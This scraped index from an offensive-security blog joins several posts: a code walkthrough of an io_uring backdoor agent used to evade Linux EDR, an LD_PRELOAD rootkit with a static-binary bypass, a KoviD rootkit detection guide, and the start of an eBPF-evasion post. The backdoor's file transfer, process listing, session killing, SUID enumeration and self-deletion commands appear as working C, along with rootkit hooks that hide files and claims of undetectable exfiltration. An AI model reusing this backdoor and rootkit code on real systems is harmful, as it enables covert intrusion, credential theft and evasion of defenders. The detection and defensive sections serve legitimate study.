strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks 